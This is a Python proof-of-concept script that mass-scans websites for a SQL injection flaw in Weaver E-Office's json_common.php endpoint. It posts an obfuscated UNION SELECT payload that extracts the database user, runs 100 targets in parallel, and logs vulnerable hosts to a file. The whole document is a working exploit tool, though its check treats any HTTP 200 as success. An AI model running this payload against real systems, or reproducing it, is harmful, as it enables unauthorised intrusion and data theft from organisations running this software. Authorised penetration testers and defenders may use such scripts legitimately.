import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """                                                            
____  ___  _____         .__  .__   
\   \/  / /     \ _____  |  | |  |  
 \     / /  \ /  \__  \ |  | |  |  
 /     \/    Y    \/ __ \|  |_|  |__
/___/\  \____|__  (____  /____/____/
      \_/       \/     \/  
          version = 1.0         
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微E-Office json_common.php存在sql注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help="Please input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': 'LOGIN_LANG=cn; PHPSESSID=bd702adc830fba4fbcf5f336471aeb2e',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    proxies = {
        'http': "http://127.0.0.1:8080",
        'https': "http://127.0.0.1:8080"
    }
    payload = "/building/json_common.php"
    data = 'tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,user() ,4#|2|333'
    try:
        response = requests.post(url=target + payload, headers=headers, data=data,verify=False,proxies=proxies)
        if response.status_code == 200:
            print(f"[+] 该站点{target}存在sql注入漏洞")
            with open("result.txt", "a") as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f"[-] 该站点{target}不存在sql注入漏洞")
    except Exception as e:
        print(f"[*] 该站点{target}存在访问问题，请手工测试")

if __name__ == "__main__":
    main()